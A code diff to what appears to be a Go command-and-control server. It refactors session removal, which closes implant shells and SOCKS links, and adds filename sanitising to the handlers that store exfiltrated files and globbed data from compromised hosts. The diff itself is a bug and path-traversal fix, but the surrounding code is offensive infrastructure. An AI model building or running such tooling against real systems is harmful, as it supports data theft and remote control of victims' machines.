@@ -3,13 +3,13 @@ package main
 import (
 	"bufio"
 	"crypto/sha256"
-	"encoding/binary"
 	"flag"
 	"fmt"
 	"log"
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -75,9 +75,21 @@ func (sm *SessionManager) Add(ch channel.Channel, remote interface{}, cryptoSes 
 
 func (sm *SessionManager) Remove(id uint32) {
 	sm.mu.Lock()
-	defer sm.mu.Unlock()
-	if s, ok := sm.sessions[id]; ok {
+	s, ok := sm.sessions[id]
+	if ok {
 		s.Active = false
+		delete(sm.sessions, id)
+		if sm.active == id {
+			sm.active = 0
+			for sid := range sm.sessions {
+				sm.active = sid
+				break
+			}
+		}
+	}
+	sm.mu.Unlock()
+
+	if ok {
 		s.Channel.Close()
 		if s.Shell != nil {
 			s.Shell.Close()
@@ -87,14 +99,6 @@ func (sm *SessionManager) Remove(id uint32) {
 		}
 		for _, c := range s.SocksMap {
 			c.Close()
-		}
-		delete(sm.sessions, id)
-		if sm.active == id {
-			sm.active = 0
-			for sid := range sm.sessions {
-				sm.active = sid
-				break
-			}
 		}
 	}
 }
@@ -426,6 +430,14 @@ func handleSession(s *ManagedSession, mgr *SessionManager, exfilDir string) {
 	}
 }
 
+func sanitizeFileName(name string) string {
+	name = filepath.Base(name)
+	if name == "." || name == "/" {
+		return "unnamed"
+	}
+	return name
+}
+
 func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
 	payload := string(msg.Payload)
 	parts := strings.SplitN(payload, "\x00", 3)
@@ -433,13 +445,17 @@ func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
 		fmt.Printf("[exfil] malformed exfil message\n")
 		return
 	}
-	filename := parts[0]
+	filename := sanitizeFileName(parts[0])
 	sizeStr := parts[1]
 	data := []byte(parts[2])
 	var size int64
 	fmt.Sscanf(sizeStr, "%d", &size)
 
-	destPath := fmt.Sprintf("%s/%s_%d", exfilDir, filename, s.ID)
+	destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", filename, s.ID))
+	if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
+		fmt.Printf("[exfil] save error: %v\n", err)
+		return
+	}
 	if err := os.WriteFile(destPath, data, 0644); err != nil {
 		fmt.Printf("[exfil] save error: %v\n", err)
 		return
@@ -463,9 +479,13 @@ func handleExfilGlob(msg protocol.Message, exfilDir string, s *ManagedSession) {
 			continue
 		}
 
-		destPath := fmt.Sprintf("%s/%s_%d", exfilDir, f.Path, s.ID)
-		destDir := destPath[:strings.LastIndex(destPath, "/")]
-		os.MkdirAll(destDir, 0755)
+		safePath := sanitizeFileName(f.Path)
+		destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", safePath, s.ID))
+		destDir := filepath.Dir(destPath)
+		if err := os.MkdirAll(destDir, 0755); err != nil {
+			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
+			continue
+		}
 
 		if err := os.WriteFile(destPath, f.Content, 0644); err != nil {
 			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
@@ -839,4 +859,4 @@ func (p *c2APIProvider) ListModules() []map[string]string {
 	return result
 }
 
-var _ = binary.BigEndian
+
